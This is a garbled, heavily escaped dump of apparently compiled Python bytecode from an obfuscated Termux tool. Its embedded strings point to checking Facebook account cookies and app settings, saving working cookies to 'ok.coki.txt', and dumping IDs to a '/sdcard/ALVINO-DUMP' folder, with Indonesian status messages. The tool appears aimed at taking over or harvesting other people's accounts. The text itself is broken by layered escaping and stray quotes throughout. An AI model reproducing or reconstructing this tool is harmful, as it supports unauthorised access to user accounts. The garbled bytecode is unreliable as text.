\\\002""\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\363\\\\\\\\010\\\\\\\\016\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\006\"\"\\\\\\\\003\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\004\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\"\\\"\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\004\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\366\\\\\\\\006\\\\\\\\013\\\\\\\\006\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\361\\\\\\\\010\\\\\\\\020\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\375\\\\\\\\006\\\\\\\\004\\\\\\\\024\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\022\\\\\\\\001\\\\\\\\014\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\010\\\\\\\\002\\\\\\\\014\\\\\\\\001\\\\\\\\020\\\\\\\\001 \\\\\\\\001\\\\\\\\022\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\006\\\\\\\\375\\\\\\\\002\\\\\\\\004\\\\\\\\002\\\\\\\\374\\\\\\\\002\\\\\\\\005\\\\\\\\006\\\\\\\\373\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\010\\\\\\\\024\\\\\\\\002\\\\\\\\004\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\n\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\026\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002""\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\375\\\\\\\\004\\\\\\\\004\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\002\\\\\\\\375\\\\\\\\002\\\\\\\\004\\\\\\\\002\\\\\\\\374\\\\\\\\002\\\\\\\\005\\\\\\\\002\\\\\\\\373\\\\\\\\002\\\\\\\\374\\\\\\\\004\\\\\\\\n\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\005\\\\\\\\014\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\"\\\\\\\"\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\006\\\\\\\\375\\\\\\\\002\\\\\\\\004\\\\\\\\002\\\\\\\\374\\\\\\\\002\\\\\\\\005\\\\\\\\006\\\\\\\\373\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\007\\\\\\\\010\\\\\\\\002\\\\\\\\n\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\026\\\\\\\\377\\\\\\\\004\\\\\\\\003\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\375\\\\\\\\004\\\\\\\\004\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\002\\\\\\\\375\\\\\\\\002\\\\\\\\004\\\\\\\\002\\\\\\\\374\\\\\\\\002\\\\\\\\005\\\\\\\\002\\\\\\\\373\\\\\\\\002\\\\\\\\374\\\\\\\\004\\\\\\\\nn\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\375\\\\\\\\010\\\\\\\\004\\\\\\\\004""\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\375\\\\\\\\010\\\\\\\\005\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\003\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\004\\\\\\\\003\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\374\\\\\\\\010\\\\\\\\005\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\003\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\376\\\\\\\\002\\\\\\\\002\\\"\\\"\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\003\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\010\\\\\\\\002\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\024\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\006\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\n\\\\\\\\005\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\006\\\\\\\\377\\\\\\\\002\\\\\\\\002\\\\\\\\002\\\\\\\\376\\\\\\\\002\\\\\\\\003\\\\\\\\006\\\\\\\\375\\\\\\\\002\\\\\\\\004\\\\\\\\002\\\\\\\\374\\\\\\\\002\\\\\\\\005\\\\\\\\006\\\\\\\\373\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\007\\\\\\\\010\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\375\\\\\\\\010\\\\\\\\004\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\375\\\\\\\\010\\\\\\\\004\\\\\\\\006\\\\\\\\001\\\\\\\\010""\\\\\\\\377\\\\\\\\010\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001 \\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001 \"\"\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\022\\\\\\\\001\\\\\\\\022\\\\\\\\002r0\\\\\\\\001\\\\\\\\000\\\\\\\\000c\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000sJ\\\\\\\\000\\\\\\\\000\\\\\\\\000z,t\\\\\\\\000\\\\\\\\240\\\\\\\\001d\\\\\\\\001\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000\\\\\\\\240\\\\\\\\001d\\\\\\\\002\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000\\\\\\\\240\\\\\\\\001d\\\\\\\\003\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000\\\\\\\\240\\\\\\\\001d\\\\\\\\004\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\030\\\\\\\\004\\\\\\\\000t\\\\\\\\002yD\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\003\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)\\\\\\\\005Nz\\\\\\\\006ID.txtz\\\\\\\\013ok.coki.txtr\\\\\\\\361\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\010.cok.txt)\\\\\\\\004r\\\\\\\\245\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\006remover\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\305\\\\\\\\000\\\\\\\\000""\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001O\\\\\\\\357\\\\\\\\006\\\\\\\\000\\\\\\\\000s\\\\\\\\016\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\002\\\\\\\\002\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\014\\\\\\\\001rg\\\\\\\\001\\\\\\\\000\\\\\\\\000c\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\007\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\t\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000s@\\\\\\\\001\\\\\\\\000\\\\\\\\000t\\\\\\\\000\\\\\\\\240\\\\\\\\001\\\\\\\\241\\\\\\\\000}\\\\\\\\001|\\\\\\\\001j\\\\\\\\002d\\\\\\\\001d\\\\\\\\002d\\\\\\\\003|\\\\\\\\000\\\\\\\\027\\\\\\\\000i\\\\\\\\001d\\\\\\\\004\\\\\\\\215\\\\\\\\002j\\\\\\\\003}\\\\\\\\002t\\\\\\\\004\\\\\\\\240\\\\\\\\005|\\\\\\\\002d\\\\\\\\005\\\\\\\\241\\\\\\\\002}\\\\\\\\003|\\\\\\\\003j\\\\\\\\006d\\\\\\\\006d\\\\\\\\007d\\\\\\\\010\\\\\\\\215\\\"\\\"\\\\\\\\002}\\\\\\\\004d\\\\\\\\td\\\\\\\\n\\\\\\\\204\\\\\\\\000|\\\\\\\\004\\\\\\\\240\\\\\\\\007d\\\\\\\\013\\\\\\\\241\\\\\\\\001D\\\\\\\\000\\\\\\\\203\\\\\\\\001}\\\\\\\\005z4t\\\\\\\\010t\\\\\\\\t|\\\\\\\\005\\\\\\\\203\\\\\\\\001\\\\\\\\203\\\\\\\\001D\\\\\\\\000]\\\\\\\\\\\\\\\"}\\\\\\\\006t\\\\\\\\nd\\\\\\\\014t\\\\\\\\013t\\\\\\\\014|\\\\\\\\005|\\\\\\\\006\\\\\\\\031\\\\\\\\000\\\\\\\\240\\\\\\\\rd\\\\\\\\rd\\\\\\\\016\\\\\\\\241\\\\\\\\002f\\\\\\\\003\\\\\\\\026\\\\\\\\000\"\"\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000q\\\\\\\\\\\\\\\\W\\\\\\\\000n\\\\\\\\036\\\\\\\\004\\\\\\\\000t\\\\\\\\016y\\\\\\\\240\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\nd\\\\\\\\017t\\\\\\\\017\\\\\\\\026\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n""\\\\\\\\0020\\\\\\\\000|\\\\\\\\001j\\\\\\\\002d\\\\\\\\020d\\\\\\\\002d\\\\\\\\003|\\\\\\\\000\\\\\\\\027\\\\\\\\000i\\\\\\\\001d\\\\\\\\004\\\\\\\\215\\\\\\\\002j\\\\\\\\003}\\\\\\\\002t\\\\\\\\004\\\\\\\\240\\\\\\\\005|\\\\\\\\002d\\\\\\\\005\\\\\\\\241\\\\\\\\002}\\\\\\\\003|\\\\\\\\003j\\\\\\\\006d\\\\\\\\006d\\\\\\\\007d\\\\\\\\010\\\\\\\\215\\\\\\\\002}\\\\\\\\004d\\\\\\\\021d\\\\\\\\n\\\\\\\\204\\\\\\\\000|\\\\\\\\004\\\\\\\\240\\\\\\\\007d\\\\\\\\013\\\\\\\\241\\\\\\\\001D\\\\\\\\000\\\\\\\\203\\\\\\\\001}\\\\\\\\005z2t\\\\\\\\010t\\\\\\\\t|\\\\\\\\005\\\\\\\\203\\\\\\\\001\\\\\\\\203\\\\\\\\001D\\\\\\\\000] }\\\\\\\\006t\\\\\\\\nd\\\\\\\\022t\\\\\\\\013|\\\\\\\\005|\\\\\\\\006\\\\\\\\031\\\\\\\\000\\\\\\\\240\\\\\\\\rd\\\\\\\\023d\\\\\\\\024\\\\\\\\241\\\\\\\\002f\\\\\\\\002\\\\\\\\026\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000q\\\\\\\\366W\\\\\\\\000n \\\\\\\\004\\\\\\\\000t\\\\\\\\016\\\\\\\\220\\\\\\\\001y:\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\nd\\\\\\\\025t\\\\\\\\017\\\\\\\\026\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)\\\\\\\\026Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer\\\\\\\\256\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\013noscript=1;r\\\\\\\\257\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\013html.parser\\\\\\\\332\\\\\\\\004formr\\\\\\\\347\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\001r\\\\\\\\\\\\\\\"\\\\\\\\001\\\\\\\\000\\\\\\\\000c\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\003\\\\\\\\000\\\\\\\\000\\\\\\\\000S\\\\\\\\000\\\\\\\\000\\\\\\\\000s\\\\\\\\022\\\\\\\\000\\\\\\\\000\\\\\\\\000g\\\\\\\\000|\\\\\\\\000]\\\\\\\\n}\\\\\\\\001|\\\\\\\\001j\\\\\\\\000\\\\\\\\221\\\\\\\\002q\\\\\\\\004S\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\251\\\\\\\\001r""\\\\\\\\275\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\251\\\\\\\\002rL\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001ir\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000rO\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\003\\\\\\\\007\\\\\\\\000\\\\\\\\000rP\\\\\\\\001\\\\\\\\000\\\\\\\\000z\\\\\\\\037infoaccount.<locals>.<listcomp>Z\\\\\\\\002h3u\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\r%s  \\\\\\\\033[0m              \\\\\\\\342\\\\\\\\236\\\\\\\\245 %s%sz\\\\\\\\020Ditambahkan padaz\\\\\\\\021 Ditambahkan padaz\\\\\\\\032\\\\\\\\r    %s\\\\\\\\033[0m cookie invalidz>ht\"\"tps://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\003\\\\\\\\000\\\\\\\\000\\\\\\\\000S\\\\\\\"\\\\\\\"\\\\\\\\000\\\\\\\\000\\\\\\\\000s\\\\\\\\022\\\\\\\\000\\\\\\\\000\\\\\\\\000g\\\\\\\\000|\\\\\\\\000]\\\\\\\\n}\\\\\\\\001|\\\\\\\\001j\\\\\\\\000\\\\\\\\221\\\\\\\\002q\\\\\\\\004S\\\\\\\\000r\\\"\\\"\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000ri\\\\\\\\001\\\\\\\\000\\\\\\\\000rj\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000rO\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\023\\\\\\\\007\\\\\\\\000\\\\\\\\000rP\\\\\\\\001\\\\\\\\000\\\\\\\\000u\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\r%s  \\\\\\\\033[0m              \\\\\\\\342\\\\\\\\236\\\\\\\\245 %sZ\\\\\\\\013Kedaluwarsaz\\\\\\\\014 Kedaluwarsaz\\\\\\\\032\\\\\\\\r    %s \\\\\\\\033[0mcookie invalid)\\\\\\\\020r\\\\\\\\271\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\332\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\272\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\275\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003bs4r\\\\\\\\021""\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\004findZ\\\\\\\\010find_allr\\\\\\\\005\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\365\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\013\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001P\\\\\\\\332\\\\\\\\001Hrb\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\016AttributeError\\\\\\\\332\\\\\\\\001M)\\\\\\\\007rd\\\\\\\\001\\\\\\\\000\\\\\\\\000re\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\313\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003sopr\\\\\\\\343\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\004gamerk\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000r`\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\006\\\\\\\\000\\\\\\\\000sN\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\005\\\\\\\\014\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\024\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\004\\\\\\\\377\\\\\\\\004\\\\\\\\377\\\\\\\\002\\\\\\\\377\\\\\\\\n\\\\\\\\004\\\\\\\\014\\\\\\\\001\\\\\\\\022\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\376\\\\\\\\010\\\\\\\\005\\\\\\\\014\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\024\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\022\\\\\\\\377\\\\\\\\014\\\\\\\\002\\\\\\\\016\"\"\\\\\\\\001r`\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\010__main__z\\\\\\\\010git pullr\\\\\\\\371\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\372\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\023/sdcard/ALVINO-DUMPz\\\\\\\\017touch .prox.txtz\\\\\\\\026pkg install play-audio)\\\\\\\\306""\\\\\\\\332\\\\\\\\003foo\\\\\\\\332\\\\\\\\003bar\\\\\\\\332\\\\\\\\007hashlibr\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\006shutil\\\\\\\\332\\\\\\\\004math\\\\\\\\332\\\\\\\\006urllibZ\\\\\\\\003pip\\\\\\\\332\\\\\\\\006socket\\\\\\\\332\\\\\\\\004zlibr\\\\\\\\336\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\nuser_agentZ\\\\\\\\004uuidr\\\\\\\\273\\\\\\\\000\\\\\\\\000\\\\\\\\000rl\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\006base64Z\\\\\\\\004richZ\\\\\\\\007urllib3\\\\\\\\332\\\\\\\\010platformr\\\\\\\\323\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\022concurrent.futuresr\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\nBrayennnXDZ\\\\\\\\016urllib.requestr\\\\\\\\003\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\245\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\004\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\271\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\237\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\233\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\005\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\006\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\007\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\"\\\"\\\\\\\\332\\\\\\\\010datetimer\\\\\\\\t\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\n\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\013\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\006printsZ\\\\\\\\006rprintZ\\\\\\\\trich.treer\\\\\\\\014\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\014rich.columnsr\\\\\\\\r\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003colZ\\\\\\\\rrich.markdownr\\\\\\\\016\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\303\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\nrich.panelr\\\\\\\\017\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\001\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000r&\\\\\\\\001\\\\\\\\000\\\\\\\\000Z\\\\\\\\005panelZ\\\\\\\\014rich.consoler\\\\\\\\020\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\002gpr.\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\021\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\003par\\\\\\\\332\\\\\\\\006par""serrr\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\022\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\304\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\nrich.tabler\\\\\\\\023\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\002me\\\\\\\\332\\\\\\\\005today\\\\\\\\332\\\\\\\\003now\\\\\\\\332\\\\\\\\006targetr\\\\\\\\305\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001Z\\\\\\\\332\\\\\\\\001R\\\\\\\\332\\\\\\\\001X\\\\\\\\332\\\\\\\\001F\\\\\\\\332\\\\\\\\001C\\\\\\\\332\\\\\\\\001Br\\\\\\\\032\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001Er\\\\\\\\020\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001SZ\\\\\\\\002a1Z\"\"\\\\\\\\002a2\\\\\\\\332\\\\\\\\002a3Z\\\\\\\\002a4Z\\\\\\\\002a5Z\\\\\\\\002a6Z\\\\\\\\002a7Z\\\\\\\\002a8Z\\\\\\\\002a9Z\\\\\\\\003a10Z\\\\\\\\003a11Z\\\\\\\\003a12Z\\\\\\\\003a13Z\\\\\\\\003a14Z\\\\\\\\003a15Z\\\\\\\\003a16Z\\\\\\\\003a17Z\\\\\\\\003a18Z\\\\\\\\003a19